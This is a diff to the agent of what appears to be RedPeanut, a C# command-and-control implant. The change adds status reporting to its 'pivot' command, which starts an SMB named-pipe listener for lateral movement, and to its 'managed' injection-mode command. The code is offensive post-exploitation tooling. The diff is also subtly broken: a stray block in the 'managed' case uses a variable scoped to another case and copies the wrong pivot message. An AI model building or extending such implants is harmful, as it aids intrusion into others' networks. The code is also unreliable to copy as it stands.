@@ -49,6 +49,8 @@ namespace RedPeanutAgent
             bool smbstarted = false;
             bool managed = injectionmanaged;
 
+            List<string> smblisteners = new List<string>();
+
             Dictionary<string, List<Core.Utility.TaskMsg>> commands = new Dictionary<string, List<Core.Utility.TaskMsg>>();
 
             Random r = new Random();
@@ -145,6 +147,7 @@ namespace RedPeanutAgent
                                     }
                                     break;
                                 case "pivot":
+                                    string output;
                                     if (!smbstarted)
                                     {
                                         try
@@ -153,12 +156,21 @@ namespace RedPeanutAgent
                                             servert = new Thread(new ThreadStart(smblistener.Execute));
                                             servert.Start();
                                             smbstarted = true;
+                                            Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                            output = string.Format("[*] Pivot created. Pipe name {0}", agentid);
                                         }
-                                        catch (Exception)
+                                        catch (Exception e)
                                         {
-
+                                            output = string.Format("[*] Crete pivot error: {0}", e.Message);
                                         }
                                     }
+                                    else
+                                    {
+                                        output = string.Format("[*] Pivot listener already exists");
+                                    }
+
+                                    Execution.CommandExecuter commandOutuput = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                    commandOutuput.SendResponse(output);
                                     break;
                                 case "download":
                                     try
@@ -185,6 +197,12 @@ namespace RedPeanutAgent
                                     break;
                                 case "managed":
                                     managed = task.InjectionManagedTask.Managed;
+                                    {
+                                        output = string.Format("[*] Pivot listener already exists");
+                                    }
+
+                                    Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                    commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode",managed == true ? "Managed":"Unmanaged"));
                                     break;
                                 default:
                                     try
